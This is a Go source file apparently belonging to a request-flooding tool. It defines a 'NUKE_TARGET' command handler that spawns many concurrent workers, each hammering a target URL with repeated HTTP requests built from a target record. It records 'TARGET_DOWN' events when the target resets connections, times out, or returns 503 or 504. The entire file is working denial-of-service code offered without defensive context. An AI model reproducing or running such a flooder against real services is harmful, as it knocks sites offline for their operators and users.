package handler

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"syscall"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/mg/dto"
	"github.com/andriiyaremenko/tinycqs/command"
	"github.com/pkg/errors"
)

func NukeTarget(client http.Client, amountSylos int, amountRequests int64) command.Handler {
	return &command.BaseHandler{
		Type: "NUKE_TARGET",
		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
			defer w.Done()

			select {
			case <-ctx.Done():
				return
			default:
			}

			p := e.Payload()
			target := new(dto.Target)
			if err := json.Unmarshal(p, target); err != nil {
				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target record")))
				return
			}

			var wg sync.WaitGroup
			for i := amountSylos; i > 0; i-- {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for i := amountRequests; i > 0; i-- {
						req, err := http.NewRequest(target.Method, target.URL, bytes.NewReader(target.Data))
						if err != nil {
							log.Println(logw.Error, err)
							return
						}

						for _, header := range target.Headers {
							req.Header.Add(header[0], header[1])
						}

						resp, err := client.Do(req)

						if errors.Is(err, io.EOF) ||
							errors.Is(err, syscall.ECONNRESET) ||
							errors.Is(err, context.DeadlineExceeded) ||
							os.IsTimeout(err) {
							w.Write(command.E{
								Type: "TARGET_DOWN",
								P:    p,
							})
							return
						}

						if err != nil {
							w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
							return
						}

						resp.Body.Close()

						if resp.StatusCode == http.StatusServiceUnavailable ||
							resp.StatusCode == http.StatusGatewayTimeout {
							w.Write(command.E{
								Type: "TARGET_DOWN",
								P:    p,
							})

							return
						}

						if resp.StatusCode < 300 {
							w.Write(command.E{
								Type: "TARGET_ALIVE",
								P:    p,
							})

							return
						}

						targetErr := dto.TargetError{
							Target:  *target,
							ErrCode: resp.StatusCode,
						}

						b, err := json.Marshal(targetErr)
						if err != nil {
							w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))
							return
						}

						w.Write(command.E{
							Type: "TARGET_ERROR",
							P:    b,
						})
					}
				}()
			}

			wg.Wait()
		},
	}
}
